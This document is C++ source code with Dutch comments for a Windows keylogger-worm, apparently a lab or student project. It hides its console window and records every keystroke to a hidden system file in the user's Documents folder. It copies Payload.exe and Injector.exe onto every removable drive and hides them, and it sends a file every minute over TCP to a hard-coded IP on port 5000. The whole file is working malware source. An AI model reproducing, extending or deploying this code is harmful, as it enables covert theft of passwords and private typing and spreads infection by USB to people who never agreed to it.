#define _WIN32_WINNT 0x0600
#include <WinSock2.h>
#include <shlobj.h>
#include <Shlwapi.h>
#include <string>
#include <filesystem>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <fstream>
#include <map>

using namespace std;

const char *drive[]={ 
    "a:", "b:", "c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
    "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
    "y:", "z:", 0
};
const char* ipAdres = "192.168.56.1";
const char payload[MAX_PATH]="\\Payload.exe";
const char infector[MAX_PATH]="\\Injector.exe";


char* GetUser() {
    char* user = getenv("USERNAME");
    return user;
}

void CreateLog() {
    string username = GetUser();
    string filename = username + ".txt";
    string filename2 = "\\" + username + ".txt";

    char saveLocation[MAX_PATH] = {0};
    SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, saveLocation);

    string filePath = string(saveLocation) + "\\" + filename;
    fstream LogFile(filePath , fstream::app);
    SetFileAttributes(filePath.c_str(),FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    //std::cout << "file path in LOG: " << filePath.c_str() << std::endl;
    
    return;
}

void LOG(string input, char* logFile) {
    string filePath = string(logFile);
    fstream LogFile(filePath , fstream::app);
    //std::cout << "Halllo Ik copy nu hier!: " << logFile << std::endl;
    if (LogFile.is_open()) {
        LogFile << input;
        LogFile.close();
    }
    return;
} 

// voegt speciale toetsen toe aan een map
bool SpecialKeys(int S_Key, char* logFile) {
    //std::cout << "file path in Special: " << logFile << std::endl;
    static map<int, string> specialKeys = {
        {VK_SPACE, " "},
        {VK_RETURN, "\n"},
        {VK_SHIFT, "⇧"},
        {VK_BACK, "⌫"},
        {VK_DELETE, "⌦"},
        {VK_LBUTTON, "[L  ]"},
        {VK_MBUTTON, "[ M ]"},
        {VK_RBUTTON, "[  R]"},
        {VK_CAPITAL, "⇪"},
        {VK_ESCAPE, "☒"},
        {91, "❖"},
        {VK_TAB, "↹"},
        {VK_UP, "↑"},
        {VK_DOWN, "↓"},
        {VK_LEFT, "←"},
        {VK_RIGHT, "→"},
        {VK_CONTROL, "⌃"},
        {VK_MENU, "⎇"},
        {VK_OEM_PLUS, "+"},
        {VK_OEM_MINUS, "-"},
        {VK_OEM_1, GetKeyState(VK_SHIFT) < 0 ? ":" : ";"},
        {VK_OEM_2, GetKeyState(VK_SHIFT) < 0 ? "?" : "/"},
        {VK_OEM_3, GetKeyState(VK_SHIFT) < 0 ? "~" : "`"},
        {VK_OEM_4, GetKeyState(VK_SHIFT) < 0 ? "{" : "["},
        {VK_OEM_5, GetKeyState(VK_SHIFT) < 0 ? "|" : "\\"},
        {VK_OEM_6, GetKeyState(VK_SHIFT) < 0 ? "}" : "]"},
        {VK_OEM_7, GetKeyState(VK_SHIFT) < 0 ? "\"" : "'"},
        {VK_OEM_COMMA, GetKeyState(VK_SHIFT) < 0 ? "<" : ","},
        {VK_OEM_PERIOD, GetKeyState(VK_SHIFT) < 0 ? ">" : "."}
    };

    // als de toets in de map zit dan logt hij de toets
    if (specialKeys.find(S_Key) != specialKeys.end()) {
        cout << specialKeys[S_Key];
        LOG(specialKeys[S_Key], logFile);
        return true;
    }
    return false;
}

// als de toetsen ctrl, shift en * worden ingedrukt dan stopt de keylogger
bool KillSwitch() {
    return (GetAsyncKeyState(VK_SHIFT) < 0) &&
           (GetAsyncKeyState(VK_CONTROL) < 0) &&
           (GetAsyncKeyState(VK_MULTIPLY) < 0);
}


int KeyLogger(char* logFile)
{
    // voor elke toets wordt er gekeken of hij is ingedrukt
    for (int KEY = 1; KEY <= 255; KEY++) {
        if (GetAsyncKeyState(KEY) == -32767) {
            if (!SpecialKeys(KEY, logFile)) {
                char logged_key = static_cast<char>(KEY);
                // numpad toetsen worden omgezet naar normale toetsen
                if (KEY >= VK_NUMPAD0 && KEY <= VK_NUMPAD9) {
                    logged_key = '0' + (KEY - VK_NUMPAD0);
                // kijken of de toets een hoofdletter of kleine letter is (shift en capslock)
                } else if (isalpha(logged_key)) {
                    logged_key = (GetKeyState(VK_SHIFT) < 0) ^ (GetKeyState(VK_CAPITAL) & 1) ? toupper(logged_key) : tolower(logged_key);
                }
                // logt de toets
                LOG(string(1, logged_key), logFile);
            }
        }
    }
    
    return 0;
}

int FindDrv(const char *drive)
{
    char dirX[MAX_PATH];
    char dirX2[MAX_PATH];
    char path[MAX_PATH];
    char path2[MAX_PATH];
    //char autorun[MAX_PATH]="AutoRun.inf";
    //std::ofstream CreAut;
    
    //gets path of the current files
    HMODULE GetQ; 
    GetQ=GetModuleHandle(NULL);
    GetModuleFileName(GetQ,path,sizeof(path));

    std::string tempString = path;
    std::string buff = tempString.substr(0, tempString.find_last_of("\\"));
    strcpy(path, buff.c_str());
    strcat(path, payload);
    strcpy(path2, buff.c_str());
    strcat(path2, infector);
    
    //CreAut.open(dirX,std::ios_base::out);
    //CreAut<<"[AutoRun]" << std::endl;
    //CreAut<<"open=test.exe" << std::endl;
    //CreAut<<"shellexecute=test.exe" << std::endl;
    //CreAut<<"UseAutoPlay=1" << std::endl;
    //CreAut<<"shell\\Auto\\command=test.exe" << std::endl;
    //CreAut<<"shell=Auto" << std::endl;
    //CreAut.close();
    //SetFileAttributes(dirX,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);

    UINT type= GetDriveType(drive);
    
    if(type == DRIVE_REMOVABLE)
    {
        strcpy(dirX, drive);
        strcat(dirX, payload);
        strcpy(dirX2, drive);
        strcat(dirX2, infector);

        CopyFile(path,dirX,TRUE);
        CopyFile(path2,dirX2,TRUE); 
        SetFileAttributes(path,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
        //strcpy(dirX, drive);
        //strcat(dirX, "\\" );
        //strcat(dirX, autorun);
        //std::cout << "dirX: " << dirX << std::endl << std::endl << std::endl;

        return 0;
    } else {
        //std::cout << "Not detected removable" << std::endl;
    }
    return 0;
 
}

int Worm() {
    for(int i=0;drive[i];i++)
    {
        FindDrv(drive[i]);
    }
    return 0;
}

int SendLog() {

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "Error: Failed to initialize Winsock" << endl;
        return -1;
    }
    cerr << "Winsock initialized" << endl;
    
    // Set up the server address
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(5000);
    serverAddr.sin_addr.s_addr = inet_addr(ipAdres); //IP van receiving machine

    // Create a socket and connect to the server
    SOCKET clientSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSock == INVALID_SOCKET) {
        cerr << "Error: Failed to create socket" << endl;
        WSACleanup();
        return -1;
    }
    cerr << "Socket created" << endl;
    if (connect(clientSock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Error: Failed to connect to server" << endl;
        closesocket(clientSock);
        WSACleanup();
        return -1;
    }
    cerr << "Connected to server" << endl;

    // Open the file for reading
    ifstream file("myfile.txt", ios::binary); //file die je door wilt sturen
    if (!file.is_open()) {
        cerr << "Error: Failed to open file for reading" << endl;
        closesocket(clientSock);
        WSACleanup();
        return -1;
    }
    cerr << "Open file for reading" << endl;

    // Send the file data over the socket
    const int bufferSize = 1024;
    char buffer[bufferSize];
    int bytesRead;
    while (file.read(buffer, bufferSize)) {
        bytesRead = send(clientSock, buffer, file.gcount(), 0);
        if (bytesRead == SOCKET_ERROR) {
            cerr << "Error: Failed to send data over socket" << endl;
            file.close();
            closesocket(clientSock);
            WSACleanup();
            return -1;
        }
        cerr << "Data sent over socket" << endl;
    }
    bytesRead = send(clientSock, buffer, file.gcount(), 0);  // send any remaining data
    if (bytesRead == SOCKET_ERROR) {
        cerr << "Error: Failed to send data over socket" << endl;
        file.close();
        closesocket(clientSock);
        WSACleanup();
        return -1;
    }
    cerr << "Data Sent over socket" << endl;

    // Close the file and the socket
    file.close();
    closesocket(clientSock);
    WSACleanup();

    return 0;
}

int main()
{   
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // zolang de keylogger niet wordt gestopt blijft hij lopen
    auto last_executed_time = std::chrono::steady_clock::now();

    //maak de log file aan
    CreateLog();

    //krijg path
    string username = GetUser();
    string filename = username + ".txt";
    string filename2 = "\\" + username + ".txt";
    
    char saveLocation[MAX_PATH] = {0};
    SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, saveLocation);
    string filePath = string(saveLocation) + "\\" + filename;
    char logFiledir[MAX_PATH];
    strcpy(logFiledir, filePath.c_str());
    
    //std::cout << "file path in Main: " << logFiledir << std::endl;

    while (true) {
        auto current_time = std::chrono::steady_clock::now();
        auto elapsed_time = std::chrono::duration_cast<std::chrono::minutes>(current_time - last_executed_time).count();
        if (elapsed_time >= 1) {
            SendLog(); // voert de sendlog uit
            last_executed_time = current_time;                        
        }
        Sleep(10);
        // als de killswitch is geactiveerd dan logt ##KILLED##
        if (KillSwitch()) {
            LOG("##KILLED##", logFiledir);
            break;
        }
        Worm(); // voert de worm uit 
        KeyLogger(logFiledir); // voert de keylogger uit
    }   
    return 0;
}